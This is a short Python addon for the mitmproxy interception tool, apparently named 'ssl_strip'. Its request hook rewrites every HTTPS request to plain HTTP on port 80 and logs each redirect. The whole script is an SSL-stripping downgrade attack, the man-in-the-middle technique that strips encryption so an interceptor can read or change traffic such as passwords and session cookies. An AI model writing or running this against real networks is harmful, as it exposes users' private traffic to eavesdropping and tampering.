from mitmproxy import http
from mitmproxy import ctx

def request(flow: http.HTTPFlow) -> None:
    if flow.request.pretty_url.startswith("https://"):
        flow.request.scheme = "http"
        flow.request.port = 80
        ctx.log.info(f"Redirecting {flow.request.pretty_url} to HTTP")

addons = [
    "ssl_strip"
]